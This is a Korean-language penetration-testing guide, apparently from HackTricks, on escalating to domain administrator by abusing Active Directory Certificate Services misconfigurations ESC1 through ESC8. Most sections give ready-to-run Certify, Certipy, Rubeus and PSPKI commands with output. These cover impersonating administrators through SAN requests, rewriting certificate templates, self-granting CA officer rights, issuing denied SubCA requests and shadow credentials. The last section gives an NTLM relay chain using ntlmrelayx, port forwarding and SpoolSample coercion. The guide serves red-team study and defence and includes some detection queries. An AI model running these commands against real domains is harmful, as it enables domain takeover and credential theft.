# AD CS 도메인 권한 상승

{{#include ../../../banners/hacktricks-training.md}}


**이 문서는 다음 포스트들의 권한 상승 기법 섹션을 요약한 것입니다:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 잘못 구성된 인증서 템플릿 - ESC1

### 설명

### 잘못 구성된 인증서 템플릿 - ESC1 설명

- **Enterprise CA가 낮은 권한의 사용자에게 등록(enrolment) 권한을 부여한다.**
- **관리자 승인이 필요하지 않다.**
- **권한 있는 담당자의 서명이 필요하지 않다.**
- **인증서 템플릿의 Security descriptors가 지나치게 관대하여 낮은 권한의 사용자가 등록 권한을 얻을 수 있다.**
- **인증서 템플릿이 인증을 가능하게 하는 EKU를 정의하도록 구성되어 있다:**
- EKU 식별자 예: Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), 또는 EKU 없음(SubCA) 등이 포함된다.
- **템플릿이 요청자가 Certificate Signing Request (CSR)에 subjectAltName을 포함하는 것을 허용한다:**
- Active Directory (AD)는 인증서에 subjectAltName (SAN)이 있으면 식별 검증을 위해 SAN을 우선시한다. 이는 CSR에 SAN을 지정하면 도메인 관리자와 같은 어떤 사용자로도 가장하여 인증서를 요청할 수 있음을 의미한다. 요청자가 SAN을 지정할 수 있는지는 인증서 템플릿의 AD 객체에 있는 `mspki-certificate-name-flag` 속성으로 표시된다. 이 속성은 비트마스크이며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 있으면 요청자가 SAN을 지정할 수 있다.

> [!CAUTION]
> 위에 설명된 구성은 낮은 권한의 사용자가 임의의 SAN을 가진 인증서를 요청할 수 있게 하여 Kerberos 또는 SChannel을 통해 어떤 도메인 주체로도 인증할 수 있게 만든다.

이 기능은 제품이나 배포 서비스가 HTTPS 또는 호스트 인증서를 즉석에서 생성하기 위해, 또는 설정에 대한 이해 부족으로 인해 때때로 활성화된다.

이 옵션으로 인증서를 생성하면 경고가 발생하는 것으로 알려져 있다. 그러나 기존 인증서 템플릿(예: `WebServer` 템플릿—`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`가 활성화된)이 복제되어 인증 OID를 포함하도록 수정된 경우에는 경고가 발생하지 않는다.

### 악용

취약한 인증서 템플릿을 찾으려면 다음을 실행할 수 있다:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
이 취약점을 **악용하여 관리자로 가장하려면** 다음을 실행할 수 있다:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
그런 다음 생성된 **인증서를 `.pfx`로 변환**하고 이를 사용해 **Rubeus 또는 certipy로 다시 인증**할 수 있습니다:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 바이너리 "Certreq.exe" 및 "Certutil.exe"는 PFX를 생성하는 데 사용할 수 있습니다: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest의 구성 스키마 내에서 인증서 템플릿을 열거하는 작업은 다음 LDAP 쿼리를 실행하여 수행할 수 있습니다. 특히 승인이나 서명이 필요하지 않고, Client Authentication 또는 Smart Card Logon EKU를 가지며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 활성화된 템플릿을 대상으로 합니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 잘못 구성된 인증서 템플릿 - ESC2

### 설명

1. Enterprise CA에 의해 낮은 권한의 사용자에게 등록(enrollment) 권한이 부여된다.
2. 관리자 승인 요구 사항이 비활성화된다.
3. 권한 있는 서명(authorized signatures)에 대한 요구가 생략된다.
4. certificate template에 설정된 과도하게 관대한 security descriptor가 낮은 권한의 사용자에게 인증서 등록 권한을 부여한다.
5. **certificate template가 Any Purpose EKU를 포함하거나 EKU가 없도록 정의되어 있다.**

**Any Purpose EKU**는 공격자가 클라이언트 인증, 서버 인증, 코드 서명 등과 같은 모든 목적(**any purpose**)으로 인증서를 획득할 수 있도록 허용한다. 이 시나리오를 악용하는 데는 **ESC3에서 사용된 동일한 기법**을 이용할 수 있다.

**EKU가 없는(no EKUs)** 인증서는 하위 CA 인증서로 동작하며 **어떤 목적**으로든 악용될 수 있고 **새 인증서 서명에도 사용될 수 있다**. 따라서 공격자는 하위 CA 인증서를 이용해 새 인증서에 임의의 EKU나 필드를 지정할 수 있다.

다만, 하위 CA가 기본 설정인 **`NTAuthCertificates`** 객체에서 신뢰되지 않는다면 **domain authentication** 용도로 생성된 새 인증서는 작동하지 않는다. 그럼에도 공격자는 여전히 **임의의 EKU를 가진 새 인증서**와 임의의 인증서 값을 생성할 수 있다. 이러한 인증서는 (예: 코드 서명, 서버 인증 등) 다양한 목적에 잠재적으로 **악용**될 수 있으며 SAML, AD FS, 또는 IPSec 같은 네트워크 내 다른 애플리케이션에 중대한 영향을 미칠 수 있다.

AD Forest의 구성 스키마 내에서 이 시나리오와 일치하는 템플릿을 나열하려면, 다음 LDAP 쿼리를 실행할 수 있다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 잘못 구성된 Enrolment Agent 템플릿 - ESC3

### 설명

이 시나리오는 첫 번째 및 두 번째 시나리오와 유사하지만 **다른 EKU**(Certificate Request Agent)를 **악용**하고 **서로 다른 2개의 템플릿**을 사용합니다(따라서 요구사항 세트도 2개입니다).

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1)는 Microsoft 문서에서 **Enrollment Agent**로 알려져 있으며, 주체가 **다른 사용자를 대신하여** **certificate**에 **enroll**할 수 있도록 합니다.

**“enrollment agent”**는 해당 **template**에 enroll하고, 생성된 **certificate**를 사용해 **다른 사용자를 대신하여 CSR에 공동 서명(co-sign)**합니다. 그 후 **공동 서명된 CSR**을 CA에 **전송**하고, CA에서 **“enroll on behalf of”를 허용하는 template**에 등록하면 CA는 **“다른” 사용자에 속하는 certificate**를 발급합니다.

**Requirements 1:**

- Enterprise CA가 권한이 낮은 사용자에게 enrollment 권한을 부여합니다.
- 관리자 승인 요구가 생략되어 있습니다.
- 권한 있는 서명(authorized signatures)에 대한 요구가 없습니다.
- certificate template의 security descriptor가 지나치게 관대하여 권한이 낮은 사용자에게 enrollment 권한을 부여합니다.
- certificate template에 Certificate Request Agent EKU가 포함되어 있어 다른 주체를 대신하여 다른 certificate template을 요청할 수 있습니다.

**Requirements 2:**

- Enterprise CA가 권한이 낮은 사용자에게 enrollment 권한을 부여합니다.
- 관리자 승인이 우회됩니다.
- 템플릿의 schema version이 1이거나 2를 초과하며, Application Policy Issuance Requirement를 지정하고 그 요구사항에 Certificate Request Agent EKU가 필요합니다.
- certificate template에 정의된 EKU 중 하나가 도메인 인증(domain authentication)을 허용합니다.
- enrollment agent에 대한 제한이 CA에 적용되지 않습니다.

### 악용

You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**users**가 **enrollment agent certificate**을 **obtain**할 수 있는지, enrollment **agents**가 등록할 수 있는 템플릿, 그리고 enrollment agent가 대행할 수 있는 **accounts**는 엔터프라이즈 CA에서 제한할 수 있다. 이는 `certsrc.msc` **snap-in**을 열고, **CA를 우클릭**한 뒤 **Properties**를 클릭하고 “Enrollment Agents” 탭으로 **navigating**하면 된다.

그러나 CA의 **default** 설정은 “**Do not restrict enrollment agents**.”로 되어 있는 점에 유의해야 한다. 관리자가 enrollment agents에 대한 제한을 활성화하여 “Restrict enrollment agents”로 설정하더라도, 기본 구성은 여전히 매우 관대하다. 이는 **Everyone**이 모든 템플릿에 대해 누구로든 등록(enroll)할 수 있도록 허용한다.

## 취약한 인증서 템플릿 접근 제어 - ESC4

### **설명**

**보안 설명자(security descriptor)**는 **인증서 템플릿(certificate templates)**에 대해 특정 **AD 주체(AD principals)**가 보유한 **권한(permissions)**을 정의한다.

만약 **공격자(attacker)**가 **템플릿(template)**을 **수정(alter)**하고 이전 섹션에서 설명한 어떤 **취약하게 활용 가능한 구성(exploitable misconfigurations)**을 **적용(institute)**할 권한을 가지고 있다면, 권한 상승(privilege escalation)이 가능해질 수 있다.

인증서 템플릿에 적용될 수 있는 주요 권한은 다음과 같다:

- **Owner:** 객체에 대한 암묵적 제어권을 부여하여, 모든 속성을 수정할 수 있다.
- **FullControl:** 객체에 대한 완전한 권한을 부여하여 모든 속성을 변경할 수 있다.
- **WriteOwner:** 객체의 소유자를 공격자가 제어하는 주체로 변경할 수 있게 한다.
- **WriteDacl:** 접근 제어를 조정하여 공격자에게 FullControl을 부여할 가능성을 만든다.
- **WriteProperty:** 객체의 어떤 속성이라도 편집할 수 있는 권한을 허용한다.

### 악용

템플릿 및 기타 PKI 객체에 대해 편집 권한을 가진 주체들을 식별하려면, Certify로 열거(enumerate)하라:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
앞의 예와 유사한 privesc의 예:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4는 user가 certificate template에 대해 write privileges를 가진 경우입니다. 예를 들어, 이는 certificate template의 구성을 덮어써서 해당 template을 ESC1에 취약하게 만드는 데 악용될 수 있습니다.

위 경로에서 알 수 있듯이, 오직 `JOHNPC`만이 이러한 권한을 가지고 있지만, 우리 user `JOHN`은 `JOHNPC`로 향하는 새로운 `AddKeyCredentialLink` edge를 가지고 있습니다. 이 기법이 인증서와 관련되어 있기 때문에, 저는 이 공격도 구현했습니다. 이는 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로 알려져 있습니다. 다음은 피해자의 NT hash를 얻기 위한 Certipy의 `shadow auto` 명령의 미리보기입니다.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**는 단일 명령으로 인증서 템플릿의 구성을 덮어쓸 수 있습니다. **기본적으로**, Certipy는 구성을 **덮어써서** **ESC1에 취약하게 만듭니다**. 또한 이전 구성을 저장하기 위해 **`-save-old` parameter to save the old configuration**를 지정할 수 있으며, 이는 공격 후 구성을 **복원**하는 데 유용합니다.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 취약한 PKI 객체 접근 제어 - ESC5

### 설명

인증서 템플릿 및 인증 기관(CA)을 넘어서는 여러 객체를 포함하는 상호 연결된 ACL 기반 관계의 광범위한 망은 전체 AD CS 시스템의 보안에 영향을 미칠 수 있습니다. 이러한 객체들은 보안에 중대한 영향을 줄 수 있으며, 다음을 포함합니다:

- CA 서버의 AD computer object, 이는 S4U2Self 또는 S4U2Proxy와 같은 메커니즘으로 탈취될 수 있습니다.
- CA 서버의 RPC/DCOM 서버.
- 특정 컨테이너 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 모든 하위 AD 객체 또는 컨테이너. 이 경로에는 Certificate Templates container, Certification Authorities container, NTAuthCertificates object, Enrollment Services Container 등(포함되지만 이에 국한되지 않음)이 포함됩니다.

저권한 공격자가 이러한 핵심 구성요소 중 어느 하나라도 제어하게 되면 PKI 시스템의 보안이 손상될 수 있습니다.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 설명

이 주제는 [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage)에 설명된 내용과 함께 Microsoft가 명시한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 영향도 다룹니다. 이 구성이 Certification Authority (CA)에 활성화되면 Active Directory®에서 생성된 요청을 포함한 모든 요청에 대해 **subject alternative name**에 **사용자 정의 값**을 포함할 수 있게 됩니다. 결과적으로 이 설정은 공격자가 도메인 **authentication**용으로 설정된 **any template**—특히 표준 User 템플릿처럼 권한이 낮은 사용자 등록에 열려 있는 템플릿—을 통해 등록(enroll)할 수 있도록 허용합니다. 그 결과, 공격자는 인증서를 획득하여 도메인 관리자나 도메인 내의 **any other active entity**로 인증할 수 있게 됩니다.

**참고**: `certreq.exe`의 `-attrib "SAN:"` 인수를 통해 Certificate Signing Request(CSR)에 **alternative names**를 추가하는 방식(“Name Value Pairs”라 불림)은 ESC1에서 SANs를 악용하는 전략과 **대조적**입니다. 여기서 차이는 계정 정보가 어떻게 캡슐화되는지에 있으며—확장(extension)이 아니라 인증서 속성(attribute)에 포함된다는 점입니다.

### 악용

이 설정이 활성화되어 있는지 확인하려면 조직에서는 `certutil.exe`로 다음 명령을 사용할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
이 작업은 본질적으로 **remote registry access**를 사용하므로, 대안적 접근 방법은 다음과 같을 수 있습니다:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify)와 [**Certipy**](https://github.com/ly4k/Certipy) 같은 도구들은 이 잘못된 구성을 감지하고 악용할 수 있습니다:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
이러한 설정을 변경하려면, **domain administrative** 권한 또는 동등한 권한을 보유하고 있다고 가정할 때, 다음 명령을 어느 워크스테이션에서나 실행할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
환경에서 이 구성을 비활성화하려면 플래그를 다음과 같이 제거할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022년 5월 보안 업데이트 이후, 새로 발급되는 **certificates**에는 **requester's `objectSid` property**를 포함하는 **security extension**이 포함됩니다. ESC1의 경우 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우 SID는 SAN이 아니라 **requester's `objectSid`**를 반영합니다.\
> ESC6을 악용하려면 시스템이 ESC10(Weak Certificate Mappings)에 취약해야 하며, 이는 **SAN over the new security extension**을 우선시합니다.

## 취약한 Certificate Authority 접근 제어 - ESC7

### 공격 1

#### 설명

Certificate Authority의 접근 제어는 CA 동작을 관리하는 일련의 권한으로 유지됩니다. 이러한 권한은 `certsrv.msc`에 접근해 CA를 우클릭한 다음 properties를 선택하고 Security 탭으로 이동하면 확인할 수 있습니다. 또한 권한은 PSPKI 모듈을 사용하여 다음과 같은 명령으로 열거할 수 있습니다:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
이는 주요 권한인 **`ManageCA`** 및 **`ManageCertificates`**가 각각 “CA administrator”(CA 관리자) 및 “Certificate Manager”(인증서 관리자) 역할과 연관됨을 설명합니다.

#### Abuse

인증 기관에서 **`ManageCA`** 권한을 가진 주체는 PSPKI를 사용해 원격으로 설정을 조작할 수 있습니다. 여기에는 모든 템플릿에서 SAN 지정 허용을 위해 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그를 토글하는 것이 포함되며, 이는 도메인 권한 상승의 핵심 요소입니다.

이 과정은 PSPKI’s **Enable-PolicyModuleFlag** cmdlet을 사용하면 단순화되어 GUI를 직접 조작하지 않고도 설정을 변경할 수 있습니다.

**`ManageCertificates`** 권한을 소지하면 보류 중인 요청을 승인할 수 있어 'CA 인증서 관리자 승인' 보호 장치를 사실상 우회할 수 있습니다.

**Certify**와 **PSPKI** 모듈의 조합을 사용하면 인증서를 요청, 승인 및 다운로드할 수 있습니다:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 공격 2

#### 설명

> [!WARNING]
> 이전 공격에서 **`Manage CA`** 권한을 사용해 **EDITF_ATTRIBUTESUBJECTALTNAME2** 플래그를 활성화하여 **ESC6 공격**을 수행했지만, 이는 CA 서비스(`CertSvc`)를 재시작할 때까지 아무런 효과가 없다. 사용자가 `Manage CA` 액세스 권한을 가지면 해당 사용자는 **서비스를 재시작할 수 있다**. 하지만 이것이 **사용자가 서비스를 원격으로 재시작할 수 있다**는 것을 의미하지는 않는다. 또한 대부분의 패치된 환경에서는 2022년 5월 보안 업데이트 때문에 **ESC6가 바로 동작하지 않을 수 있다**.

따라서 여기에서는 다른 공격을 제시한다.

전제 조건:

- 오직 **`ManageCA` 권한**
- **`Manage Certificates`** 권한 (`ManageCA`에서 부여 가능)
- 인증서 템플릿 **`SubCA`**는 **활성화되어야 함** (`ManageCA`에서 활성화 가능)

이 기법은 `Manage CA` 및 `Manage Certificates` 액세스 권한을 가진 사용자가 **실패한 인증서 요청을 발행할 수 있다는 사실**에 의존한다. 인증서 템플릿 **`SubCA`**는 **ESC1에 취약**하지만, **관리자만** 템플릿에 등록할 수 있다. 따라서 **사용자**는 **`SubCA`**에 등록을 **요청**할 수 있고 이 요청은 **거부**되지만, 이후 매니저에 의해 **발급될 수 있다**.

#### 악용

사용자를 새로운 officer로 추가하면 **자신에게 `Manage Certificates` 권한을 부여할 수 있다**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 템플릿은 `-enable-template` 매개변수로 **CA에서 활성화할 수 있습니다**. 기본적으로, `SubCA` 템플릿은 활성화되어 있습니다.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
이 공격의 전제 조건을 충족했다면, 우리는 **`SubCA` 템플릿을 기반으로 인증서를 요청하는 것**으로 시작할 수 있습니다.

**이 요청은 거부될 것입니다**, 하지만 우리는 private key를 저장하고 request ID를 기록합니다.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
우리의 **`Manage CA` 및 `Manage Certificates`** 권한으로, `ca` 명령과 `-issue-request <request ID>` 매개변수를 사용하여 **실패한 인증서를 발급**할 수 있습니다.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
마지막으로, 우리는 `req` 명령과 `-retrieve <request ID>` 매개변수를 사용하여 **발급된 인증서를 가져올 수 있습니다**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### 공격 3 – Manage Certificates Extension Abuse (SetExtension)

#### 설명

고전적인 ESC7 남용(EDITF 속성 활성화 또는 보류 중인 요청 승인)에 더해, **Certify 2.0**은 Enterprise CA에서 *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) 역할만으로도 가능한 새로운 프리미티브를 공개했습니다.

`ICertAdmin::SetExtension` RPC 메서드는 *Manage Certificates* 권한을 가진 모든 주체가 실행할 수 있습니다. 해당 메서드는 전통적으로 합법적인 CA가 **보류 중(pending)** 요청의 확장(extension)을 업데이트하는 데 사용되었지만, 공격자는 이를 악용해 승인 대기 중인 요청에 **비기본(non-default) 인증서 확장**(예: `1.1.1.1`과 같은 커스텀 *Certificate Issuance Policy* OID)을 **덧붙일** 수 있습니다.

대상 템플릿이 해당 확장에 대해 **기본값을 정의하지 않는** 경우, 요청이 발급될 때 CA는 공격자가 설정한 값을 덮어쓰지 않습니다. 결과적으로 발급된 인증서에는 공격자가 선택한 확장이 포함되며, 이는 다음을 초래할 수 있습니다:

* 다른 취약한 템플릿의 Application / Issuance Policy 요구사항을 만족시켜 권한 상승으로 이어질 수 있음.
* 추가적인 EKUs 또는 정책을 주입하여 제3자 시스템에서 인증서에 예기치 않은 신뢰를 부여할 수 있음.

요약하면, 이전에 ESC7의 “덜 강력한” 절반으로 간주되던 *Manage Certificates* 권한은 이제 CA 구성 변경이나 더 엄격한 *Manage CA* 권한을 요구하지 않고도 전체 권한 상승 또는 장기 지속성 확보에 악용될 수 있습니다.

#### Certify 2.0으로 프리미티브 악용하기

1. **보류 상태(pending)로 남을 인증서 요청을 제출합니다.** 이는 관리자 승인이 필요한 템플릿을 사용해 강제할 수 있습니다:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 새로운 `manage-ca` 명령을 사용해 보류 중인 요청에 커스텀 확장을 추가합니다:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. 요청을 발급합니다(만약 귀하의 역할이 *Manage Certificates* 승인 권한도 포함하는 경우) 또는 운영자가 승인할 때까지 기다립니다. 발급되면 인증서를 다운로드합니다:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 결과 인증서는 이제 악의적인 issuance-policy OID를 포함하며 이후 공격(예: ESC13, 도메인 권한 상승 등)에 사용될 수 있습니다.

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 설명

> [!TIP]
> **AD CS가 설치된** 환경에서, **취약한 web enrollment endpoint**가 존재하고 최소 하나의 **domain computer enrollment 및 client authentication을 허용하는 certificate template**(예: 기본 **`Machine`** 템플릿)이 게시되어 있다면, **spooler service가 활성화된 어떤 컴퓨터든 공격자에 의해 침해될 수 있습니다**!

AD CS는 관리자가 추가로 설치할 수 있는 서버 역할을 통해 여러 **HTTP 기반 enrollment 방식**을 지원합니다. 이러한 HTTP 기반 인증서 등록 인터페이스는 **NTLM relay 공격**에 취약합니다. 공격자는 **침해된 머신으로부터**, 인바운드 NTLM을 통해 인증하는 임의의 AD 계정을 가장할 수 있습니다. 피해자 계정을 가장한 상태에서, 공격자는 이러한 웹 인터페이스에 접근해 **`User` 또는 `Machine` 인증서 템플릿을 사용해 client authentication 인증서를 요청할 수 있습니다**.

- **web enrollment interface**(구형 ASP 애플리케이션, `http://<caserver>/certsrv/`에서 사용 가능)는 기본적으로 HTTP만 사용하며 NTLM relay 공격에 대한 보호를 제공하지 않습니다. 또한 Authorization HTTP header를 통해 명시적으로 NTLM 인증만 허용하므로 Kerberos와 같은 더 안전한 인증 방법을 사용할 수 없습니다.
- **Certificate Enrollment Service**(CES), **Certificate Enrollment Policy**(CEP) Web Service, 및 **Network Device Enrollment Service**(NDES)는 기본적으로 Authorization HTTP header를 통해 negotiate 인증을 지원합니다. Negotiate 인증은 Kerberos와 **NTLM 둘 다** 지원하므로 공격자는 relay 공격 중에 **NTLM으로 강등(downgrade)** 할 수 있습니다. 이들 웹 서비스는 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 NTLM relay 공격으로부터 보호되지 않습니다. HTTPS 서비스에 대한 NTLM relay 공격 방지는 채널 바인딩(channel binding)과 결합된 HTTPS일 때만 가능합니다. 안타깝게도 AD CS는 IIS에서 Extended Protection for Authentication을 활성화하지 않으며, 이는 채널 바인딩을 위해 필요합니다.

NTLM relay 공격의 일반적인 문제는 NTLM 세션의 **짧은 지속 시간**과 공격자가 **NTLM signing을 요구하는 서비스와 상호작용할 수 없음**입니다.

그럼에도 불구하고, 이 제한은 NTLM relay 공격을 이용해 사용자의 인증서를 획득함으로써 극복될 수 있습니다. 인증서의 유효기간이 세션의 지속 시간을 결정하고, 획득한 인증서는 **NTLM signing을 요구하는 서비스**에도 사용될 수 있기 때문입니다. 탈취한 인증서 사용 방법은 다음을 참조하세요:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay 공격의 또 다른 제한은 **공격자 제어 머신이 피해자 계정에 의해 인증되어야 한다는 점**입니다. 공격자는 기다리거나 이 인증을 **강제로 유발**하려 시도할 수 있습니다:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### 악용

[**Certify**](https://github.com/GhostPack/Certify)’s `cas`는 **사용 가능한 HTTP AD CS 엔드포인트들을 열거합니다**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 속성은 엔터프라이즈 Certificate Authorities (CAs)가 Certificate Enrollment Service (CES) 엔드포인트를 저장하는 데 사용됩니다. 이러한 엔드포인트는 도구 **Certutil.exe**를 사용하여 파싱하고 나열할 수 있습니다:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify로 악용
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
